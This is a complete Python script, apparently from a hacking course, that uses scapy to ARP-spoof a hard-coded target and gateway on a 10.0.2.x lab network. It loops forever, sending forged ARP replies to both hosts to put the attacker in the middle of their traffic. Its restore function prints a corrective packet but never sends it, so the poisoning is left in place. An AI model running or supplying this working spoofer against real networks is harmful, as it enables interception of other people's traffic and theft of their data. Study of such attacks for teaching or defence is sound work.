#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

target_ip="10.0.2.15"
gateway_ip = "10.0.2.1"

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # 34. Combining Frames Review
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # this returns two list; answered and unanswered
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst= destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())

restore(target_ip, gateway_ip)

try:
    sent_packets_counts = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counts = sent_packets_counts + 2
        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
        sys.stdout.flush()
        time.sleep(2)
        
except KeyboardInterrupt:
    print("[+] Detected Keyboard Interupt .... Quiting")